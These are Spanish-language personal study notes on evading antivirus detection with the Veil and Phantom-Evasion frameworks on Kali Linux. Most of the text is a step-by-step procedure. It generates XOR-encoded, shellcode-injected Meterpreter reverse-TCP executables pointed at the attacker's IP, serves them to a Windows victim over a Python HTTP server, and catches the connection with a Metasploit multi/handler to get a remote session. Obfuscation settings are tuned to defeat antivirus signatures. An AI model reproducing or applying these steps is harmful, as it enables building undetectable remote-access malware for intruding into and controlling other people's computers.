marco de trabajo que permite usar ofuscacion para tratar de evadir los antivirus
-https://github.com/Veil-Framework
-https://github.com/oddcod3/Phantom-Evasion

Tipos de PlayLoads

-Single: pequeños y autosuficientes, simples
-Stager: codigo que se encarga de generar una conexion entre victima y atacante para luego descargar el Stage 
-Stage: es el que lleva a acabo la tarea, es pequeño de tamaño (Meterpreter por ejemplo)

(en kali)
--(Veil-evasion es la version antigua)
-https://github.com/Veil-Framework/Veil
(o directamente dede el repositorio)
-apt install veil
(es mejor usar siempre la ultima version por lo que git es mejor)
-git clone rutaGitVeil
-cd Veil
-cd config/
- ./Setup.sh --silent (lo ejecuta en la version desatendida)
(puede tardar)
-(cd vail: vail.py)
- ./veil.py(ejecuta)

-- use 2 (ordenance: necesita compilarse)
--- list playloast
--- list encoders (dificultar la deteccion por parte de los antivirus)
--- use 4 (funciona como metasploit)(4 es tcp)
---- set LHOST ip(kali)
---- set LPORT 9991 (por ejemplo)
---- set Encoder xor
---- set Badchars \x00\x0a (especificar para ese encoder los badchar no validos que queremos evitar)
---- generate (gaurdar en un archivo o compilar)
---- back

-- use 1 (Evasion)
--- list playloast (los hay en diferentes lenguajes)
--- use 29 (injectar un shell code codificado para ofuscacion y no ser detectado)(usar el 28 si falla por el cifrado AES)
#(todo esto cambiara la huella y dificultara que el antivirus detecte al programa)
---- set PROCESSOR 3
---- set SLEPP 6
---- set USERNAME Xemnas
#(todo esto cambiara la huella y dificultara que el antivirus detecte al programa)
---- generate
----- 1 (ordenace o 2 MSFVenom)
----- list playloast
----- use 4
------ set LHOST ip(kali)
------ set LPORT 9991
------ set Badchars \x00\x0a
------ set Encoder xor
------ generate (lo injecta en un archivo ejecutable)(pide poner un nombre)
------ archivoOfusEXEC (por ejemplo de nombre)
------ (pide usar un compilador ) 1

(una vez generado)
-cd /var/lib/veil/output
(handlers para el metasplot)
- cd compiled/ 
(pasar el archivo por ejemplo con phyton -m SimpleHTTPServer)
--var /var/lib/veil/output/handlers
-- msfconsole -r archivo.rc (generara el handler a la escucha )(usando metasploit)
(en windows para ver que el antivirus no lo detecta)
- ir a ip(kali:8000)
-descargar: si lo detecta es que no modificamos suficiente la huella
https://www.virustotal.com/gui/home/upload
(comprobar si ya fue detectado por la base de datos de huella virus)
(nos dice cuales lo detectarian)
(distribulle la informacion si no lo detecta)

Phantom-Evasion

necesita VEIL para funcionar

-https://github.com/oddcod3/Phantom-Evasion
(para evadir antivirus)(mina kryptos cuidado)
(desabilitar esa opcion)
(en kali)
-git clone Phantom-Evasion
--dpkg --add-architecture i386
--apt install wine32 y wine64
-- phyton 2.714 
-- wine msiexec /i python-2.7.14.msi
(dependencias para que funcione correctamente)
- cd Setup/
-nano config.txt
(eliminar el minado: Miner=false)
-py phantom-evasion.py
- 1 (modulos de windows)
--3 (injeccion sheelcode)(trata de ser indectectable)
--- 1 (msfvenom) (2 si quieres usar el sheelcode creado anteriormente)
---- (playload)windows/meterpreter/reverse_tpc
----- LHOST ip(kali)
----- LPORT 8089 (por ejemplo)
----- 4 (codificacion)
----- phantomFile (nombre de salida)
----- 3 (los procesos que tu decidad, 3 maximo)
(se genera en la carpeta de phantom-Evasion)
- pasarlo por ejemplo con python -m SimpleHTTPServer 
- en windows ip de kali:8000
- en kali crear el hanler para escuchar 
- msfconsole 
- use exploit/multi/handler
- set PLAYLOAD windows/meterpreter/reverse_tcp
- set LHOST ip(kali)
- set LPORT 8089 (el de antes)
- exploit (crea el handler)(escucha para que se conecte la victima)
--sesion -l 
-- sission -i 1
-- sysinfo
(uso de meterpreter)

